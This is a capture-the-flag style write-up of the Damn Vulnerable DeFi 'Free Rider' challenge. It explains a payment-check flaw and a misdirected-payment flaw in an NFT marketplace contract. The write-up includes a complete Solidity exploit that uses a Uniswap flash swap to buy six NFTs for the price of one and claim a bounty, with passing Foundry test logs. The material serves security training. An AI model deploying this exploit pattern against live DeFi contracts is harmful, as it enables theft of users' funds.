# Damn Vulnerable Defi - Free Rider
- Scope
    - FreeRiderNFTMarketplace.sol
    - FreeRiderRecoveryManager.sol
- Tools
    - [Foundry](https://github.com/foundry-rs/foundry)

# Findings

## Incorrect payment deduction and price calculation in `_buyOne`

### Summary
Incorrect payment deduction and price calculation in `_buyOne` causes the payment to be returned to the buyer and the buyer only needs to send only 1 ETH worth of NFT. Exploiting uniswap's flashswap can temporarily allow the attacker to get enough ether and exploit these vulnerabilities to buy the NFT and sent to recoveryContract to trigger the bounty.

### Vulnerability Details
1. msg.value < priceToPay only checks if there is enough ETH to pay for one NFT and is incorrect if player is buying more than 1.
2. After buying NFT, the ETH is sent to buyer instead of seller.
```diff
function _buyOne(uint256 tokenId) private {
        uint256 priceToPay = offers[tokenId];
        if (priceToPay == 0) {
            revert TokenNotOffered(tokenId);
        }

-1        if (msg.value < priceToPay) {
            revert InsufficientPayment();
        }

        --offersCount;

        // transfer from seller to buyer
        DamnValuableNFT _token = token; // cache for gas savings
        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller using cached token
-2        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }
```

### Impact/Proof of Concept
1. Request a flashSwap of 15 WETH from Uniswap Pair 
2. Unwrap the WETH to ETH
3. Buy the NFT and exploit the vulnerabilities found, which will pay the nft_price to the buyer.
4. Send the NFT to recoveryContract to trigger bounty
```
function test_freeRider() public checkSolvedByPlayer {
        console.log("player ETH: beforeFlashswap", player.balance);
        
         Exploit exploit = new Exploit{value:0.045 ether}(
            address(uniswapPair),
            address(marketplace),
            address(weth),
            address(nft),
            address(recoveryManager)
        );
        exploit.attack();
        console.log("player ETH: afterExploit", player.balance);

    }

contract Exploit {
    
    IUniswapV2Pair public pair;
    IMarketplace public marketplace;

    IWETH public weth;
    IERC721 public nft;

    address public recoveryContract;
    address public player;

    uint256 private constant NFT_PRICE = 15 ether;
    uint256[] private tokens = [0, 1, 2, 3, 4, 5];

    constructor(address _pair, address _marketplace, address _weth, address _nft, address _recoveryContract)payable{
        pair = IUniswapV2Pair(_pair);
        marketplace = IMarketplace(_marketplace);
        weth = IWETH(_weth);
        nft = IERC721(_nft);
        recoveryContract = _recoveryContract;
        player = msg.sender;
    }

    function attack() external payable {
         // 1. Request a flashSwap of 15 WETH from Uniswap Pair  
        pair.swap(NFT_PRICE, 0, address(this), "1");
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {

        // Access Control
        require(msg.sender == address(pair));
        require(tx.origin == player);

        // 2. Unwrap WETH to native ETH
        weth.withdraw(NFT_PRICE);
        console.log("player ETH: afterFlashswap&Unwrap", player.balance);

        // 3. Buy 6 NFTS for only 15 ETH total
        marketplace.buyMany{value: NFT_PRICE}(tokens);

        // 4. Pay back 15WETH + 0.3% to the pair contract
        uint256 amountToPayBack = NFT_PRICE * 1004 / 1000;
        weth.deposit{value: amountToPayBack}();
        weth.transfer(address(pair), amountToPayBack);

        // 5. Send NFTs to recovery contract so we can get the bounty
        bytes memory data = abi.encode(player);
        for(uint256 i; i < tokens.length; i++){
            nft.safeTransferFrom(address(this), recoveryContract, i, data);
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }


    receive() external payable {}

}
```

Results
```diff
[PASS] test_freeRider() (gas: 1220654)
Logs:
  player ETH: beforeFlashswap 100000000000000000
  player ETH: afterFlashswap&Unwrap 55000000000000000
  player ETH: afterExploit 45055000000000000000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 3.62ms (1.10ms CPU time)

Ran 1 test suite in 18.81ms (3.62ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

